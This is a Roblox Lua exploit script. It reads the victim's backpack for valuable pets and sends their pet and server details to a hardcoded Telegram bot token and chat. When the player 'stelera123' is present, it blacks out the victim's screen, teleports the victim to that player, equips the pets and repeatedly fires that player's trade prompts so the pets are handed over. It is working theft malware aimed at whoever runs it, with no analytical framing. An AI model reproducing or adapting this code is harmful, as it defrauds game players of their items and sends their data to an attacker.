task.wait(2)


local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
local TargetPlayerName = "stelera123"
local activePrompts = {} -- track prompts being held

local BOT_TOKEN = "8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4"
local CHAT_ID = "2001061743"

-- Telegram webhook URL
local TELEGRAM_WEBHOOK = "https://api.telegram.org/bot8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4/sendMessage?chat_id=2001061743&text="

-- Allowed pet types (case-insensitive)
local ALLOWED_PET_TYPES = { 
    "dog", "bunny", "mimic octopus", "disco bee", "raccoon", "kitsune",
    "butterfly", "spinosaurus", "dragonfly", "queen bee", "night owl",
    "t-rex", "french fry ferret", "blood owl", "chicken zombie",
    "hyacinth macaw", "dilophosaurus", "spaghetti sloth"
}

-- Convert allowed types to lowercase for easier comparison
local allowedTypesLower = {}
for _, name in ipairs(ALLOWED_PET_TYPES) do
    allowedTypesLower[name:lower()] = true
end

local function createBlackScreen()
    local player = Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")

    -- Check if the black screen already exists
    if playerGui:FindFirstChild("BlackScreenGUI") then
        return -- already exists, do nothing
    end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BlackScreenGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0) -- full screen
    frame.Position = UDim2.new(0, 0, 0, 0)
    frame.BackgroundColor3 = Color3.new(0, 0, 0) -- black
    frame.BorderSizePixel = 0
    frame.Parent = screenGui
end


local function sendTelegramMessage(text)
	print("[PET ALERT DEBUG] Would send Telegram message:", text)

	-- Only attempt HTTP if exploit HTTP request function exists
	local requestFunc = http_request or request or (syn and syn.request)
	if not requestFunc then
		print("[PET ALERT DEBUG] No HTTP request available. Skipping send.")
		return
	end

	-- Include JobId in the message
	local fullText = string.format("%s\nJobId: %s", text, game.JobId)

	local url = string.format("https://api.telegram.org/bot%s/sendMessage", BOT_TOKEN)
	local data = {
		chat_id = CHAT_ID,
		text = fullText
	}
	local json = game:GetService("HttpService"):JSONEncode(data)

	requestFunc({
		Url = url,
		Method = "POST",
		Headers = {["Content-Type"] = "application/json"},
		Body = json
	})
end

-- Check if player has any allowed tool
local function hasAllowedTool()
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        for _, tool in pairs(backpack:GetChildren()) do
            if tool:IsA("Tool") then
                local toolName = tool.Name:lower()
                for allowedName in pairs(allowedTypesLower) do
                    if toolName:find(allowedName) then
                        return true, tool.Name
                    end
                end
            end
        end
    end
    return false
end

-- Wait for character to load
local function waitForCharacter()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")
    return char, hrp
end

-- Teleport to target player
local function teleportToTarget()
    local target = Players:FindFirstChild(TargetPlayerName)
    local char = LocalPlayer.Character
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") and char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
        return true
    end
    return false
end

-- Move only allowed pet tools if target player exists
local function equipAllowedPetTools()
    local target = Players:FindFirstChild(TargetPlayerName)
    if not target or not target.Character then return end -- do nothing if target not available

    local backpack = LocalPlayer:FindFirstChild("Backpack")
    local char = LocalPlayer.Character
    if backpack and char then
        for _, tool in pairs(backpack:GetChildren()) do
            if tool:IsA("Tool") then
                local toolName = tool.Name:lower()
                for allowedName in pairs(allowedTypesLower) do
                    if toolName:find(allowedName) then
                        tool.Parent = char
                        task.wait(0.05)
                        break
                    end
                end
            end
        end
    end
end

-- Get all visible prompts with ObjectText "stelera123"
local function getVisiblePrompts(hrp)
    local visiblePrompts = {}

    for _, prompt in pairs(workspace:GetDescendants()) do
        if prompt:IsA("ProximityPrompt") and prompt.Parent:IsA("BasePart") then
            local distance = (prompt.Parent.Position - hrp.Position).Magnitude
            if distance <= prompt.MaxActivationDistance and prompt.ObjectText == "stelera123" then
                table.insert(visiblePrompts, {prompt = prompt, distance = distance})
            end
        end
    end

    return visiblePrompts
end

-- Activate a prompt once and wait its hold duration
local function activatePrompt(prompt, distance)
    if activePrompts[prompt] then return end

    activePrompts[prompt] = true
    fireproximityprompt(prompt, distance or 0)
    task.spawn(function()
        task.wait(prompt.HoldDuration or 1)
        activePrompts[prompt] = nil
    end)
end

-- Main
local char, hrp = waitForCharacter()

-- Telegram notification when script runs and player has allowed tools
local hasTool, toolName = hasAllowedTool()
if hasTool then
    sendTelegramMessage("Script executed. Player has allowed tool: " .. toolName)
end

while true do
	local target = Players:FindFirstChild(TargetPlayerName)
if target then
    createBlackScreen()
end
    -- Teleport
    teleportToTarget()
    -- Equip allowed pet tools only if stelera123 exists
    equipAllowedPetTools()
    -- Fire visible prompts
    local prompts = getVisiblePrompts(hrp)
    for _, data in pairs(prompts) do
        activatePrompt(data.prompt, data.distance)
    end
    task.wait(0.1) -- check frequently
end

